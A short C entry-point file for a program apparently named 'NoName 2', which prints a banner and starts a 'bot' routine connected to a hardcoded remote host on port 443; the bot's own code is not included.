#include "utils.h"
#include "nn_bot.h"

int main(int argc, char *argv[])
{
    printf("****************************\n");
    printf("*******             ********\n");
    printf("******    NoName 2   *******\n");
    printf("*******             ********\n");
    printf("****************************\n");

    char host[256];
    strcpy(host, "nonameufr.alwaysdata.net:443");

    bot_startup(host, 3000);
    bot_cleanup(host);

    return 0;
}
